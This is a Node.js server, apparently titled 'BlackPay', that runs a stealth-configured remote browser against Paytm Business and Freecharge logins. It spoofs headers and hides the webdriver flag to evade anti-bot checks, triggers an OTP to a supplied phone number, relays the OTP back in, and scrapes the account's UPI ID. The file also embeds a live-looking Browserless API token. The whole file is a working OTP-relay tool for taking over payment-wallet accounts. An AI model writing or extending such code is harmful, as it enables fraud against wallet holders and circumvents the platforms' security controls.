const express = require('express');
const cors = require('cors');
const axios = require('axios');

// Puppeteer with Stealth Plugin for Browserless
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

let activeSessions = {};

app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running with Browserless.io!" }));

// Dummy Uono Hub Routes
app.get('/next/micro/ar/all-customers', (req, res) => res.json({ success: true, data: [] }));
app.get('/next/micro/coms/contacts', (req, res) => res.json({ success: true, contacts: [] }));
app.get('/next/micro/ap/expenses', (req, res) => res.json({ success: true, expenses: [] }));
app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pending: [] }));
app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));

// ==========================================
// STEP 1: TRIGGER OTP VIA BROWSERLESS (ULTRA STEALTH & FIXED UI)
// ==========================================
app.post('/api/start-tool', async (req, res) => {
    const { phone, walletType } = req.body;
    if (!phone) return res.status(400).json({ success: false, message: "Phone required" });

    // 🔴 BROWSERLESS KA ASLI JUGAAD (Stealth + Headless False + Webdriver Disable) 🔴
    const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true&headless=false&--disable-blink-features=AutomationControlled';

    if (activeSessions[phone] && activeSessions[phone].browser) {
        try { await activeSessions[phone].browser.close(); } catch(e){}
    }
    
    activeSessions[phone] = { status: 'waiting_for_otp', upiId: null, browser: null, page: null };
    
    // 🛑 Yahan se res.json hata diya hai taaki app turant fake success na dikhaye!

    try {
        console.log(`[+] Connecting to Browserless.io for: ${phone}`);
        
        const browser = await puppeteer.connect({ 
            browserWSEndpoint: browserWSEndpoint,
            defaultViewport: null
        });

        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');

        activeSessions[phone].browser = browser;
        activeSessions[phone].page = page;

        if (walletType.toLowerCase().includes('freecharge')) {
            console.log(`[!] Opening Freecharge for ${phone}...`);
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
            await new Promise(r => setTimeout(r, 3000)); 

            await page.evaluate(() => {
                const loginBtn = Array.from(document.querySelectorAll('a, button')).find(b => b.innerText && b.innerText.toLowerCase().includes('login'));
                if (loginBtn) loginBtn.click();
            });

            await new Promise(r => setTimeout(r, 2000));
            await page.keyboard.type(phone, { delay: 50 });
            await page.keyboard.press('Enter');

        } else {
            console.log(`[!] Opening Paytm Business for ${phone}...`);
            
            // 🔥 ULTIMATE BYPASS: Indian IP aur Browser spoofing headers
            await page.setExtraHTTPHeaders({
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi;q=0.7',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            });

            // Webdriver flag ko destroy karna
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
            });

            // Page load networkidle2 se karenge (Security script poori load hone do)
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'networkidle2', timeout: 60000 });
            await new Promise(r => setTimeout(r, 3000)); 

            let pageText = await page.evaluate(() => document.body.innerText);
            if (pageText.toLowerCase().includes('server busy') || pageText.toLowerCase().includes('something went wrong')) {
                console.log(`[!] PAYTM BLOCKED IP: Server Busy dikha raha hai!`);
                throw new Error("Paytm Anti-Bot Block (Server Busy)");
            }

            // Dheere type karo
            let inputField = await page.waitForSelector('input[type="tel"], input[name="mobileNumber"]', { timeout: 15000 });
            await inputField.focus(); 
            await inputField.type(phone, { delay: 150 }); 

            // Asli click karo
            await page.evaluate(() => {
                const btns = Array.from(document.querySelectorAll('button'));
                const proceedBtn = btns.find(b => b.innerText && (b.innerText.toLowerCase().includes('proceed') || b.innerText.toLowerCase().includes('login') || b.innerText.toLowerCase().includes('sign in')));
                if (proceedBtn) proceedBtn.click();
            });
            await page.keyboard.press('Enter');
        }
        
        console.log(`[!] OTP Triggered on Browserless for ${phone}`);

        // 🔥 FIX: Asli success response yahan bhejenge, jab sach mein click ho chuka ho!
        res.json({ success: true, message: "OTP sent! Waiting for input..." });

        setTimeout(async () => {
            if (activeSessions[phone] && activeSessions[phone].status === 'waiting_for_otp') {
                try { await activeSessions[phone].browser.close(); delete activeSessions[phone]; } catch(e){}
                console.log(`[-] Session Timeout for ${phone}`);
            }
        }, 180000);

    } catch (e) {
        console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
        if(activeSessions[phone]) {
            activeSessions[phone].status = 'failed';
            if (activeSessions[phone].browser) {
                try { await activeSessions[phone].browser.close(); } catch(err){}
            }
        }
        // 🔥 FIX: Agar captcha ya error aayi toh app ko fail dikhayega, success nahi!
        res.status(500).json({ success: false, message: "Timeout or Blocked: " + e.message });
    }
});

// ==========================================
// STEP 2: VERIFY OTP & EXTRACT UPI
// ==========================================
app.post('/api/verify-tool', async (req, res) => {
    const { phone, otp } = req.body;
    console.log(`[+] Verifying OTP ${otp} for ${phone}`);

    if (activeSessions[phone] && activeSessions[phone].status === 'waiting_for_otp') {
        let page = activeSessions[phone].page;
        try {
            await page.keyboard.type(otp, { delay: 50 });
            await page.keyboard.press('Enter');
            
            console.log(`[!] OTP Entered. Extracting UPI...`);
            await new Promise(r => setTimeout(r, 5000)); 
            
            let upi = await page.evaluate(() => {
                try { return document.getElementsByClassName("account-label-texts")[1].parentElement.innerText; } 
                catch(e) { 
                    const match = document.body.innerText.match(/[a-zA-Z0-9.\-_]{3,}@(pty|paytm|freecharge|upi|ybl|ikwik)/i);
                    return match ? match[0] : "";
                }
            });

            if (!upi) upi = `${phone}@freecharge`;
            
            console.log(`[✔] Scraped UPI: ${upi}`);
            
            await activeSessions[phone].browser.close();
            delete activeSessions[phone];
            
            res.json({ success: true, message: "Bound Successfully!", upiId: upi });
            
        } catch (e) {
            if(activeSessions[phone].browser) await activeSessions[phone].browser.close();
            delete activeSessions[phone];
            res.json({ success: false, message: "Failed to extract UPI or Invalid OTP" });
        }
    } else {
        res.json({ success: false, message: "Session expired. Try again." });
    }
});

app.get('/api/check-status/:phone', (req, res) => {
    const phone = req.params.phone;
    if (activeSessions[phone]) {
        res.json({ success: true, status: activeSessions[phone].status, upiId: activeSessions[phone].upiId });
    } else {
        res.json({ success: false, status: 'not_found' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server Running on Port ${PORT}`);
    
    // 🔥 24/7 RENDER KEEP-ALIVE JUGAAD 🔥
    setInterval(() => {
        axios.get(`http://localhost:${PORT}/`).catch(() => {});
        console.log("[+] 24/7 Keep-Alive Auto-Ping Sent!");
    }, 5 * 60 * 1000); 
});
